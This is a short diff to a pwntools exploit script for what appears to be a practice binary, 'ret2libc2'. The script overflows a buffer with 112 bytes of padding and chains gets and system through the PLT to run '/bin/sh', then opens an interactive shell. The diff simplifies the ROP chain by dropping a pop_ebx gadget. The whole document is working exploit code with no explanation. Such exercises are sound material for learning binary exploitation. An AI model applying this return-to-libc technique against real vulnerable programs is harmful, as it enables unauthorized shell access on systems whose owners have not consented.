@@ -3,10 +3,9 @@ from pwn import *
 sh = process('binary/ret2libc2')
 gets_plt = 0x08048460
 system_plt = 0x08048490
-pop_ebx = 0x0804843d
-buf2 = 0x804a080
+buf = 0x804a080
 payload = flat(
-    [b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
+    [b'a' * 112, gets_plt, system_plt, buf, buf])
 sh.sendline(payload)
-sh.sendline('/bin/sh')
+sh.sendline(b'/bin/sh')
 sh.interactive()
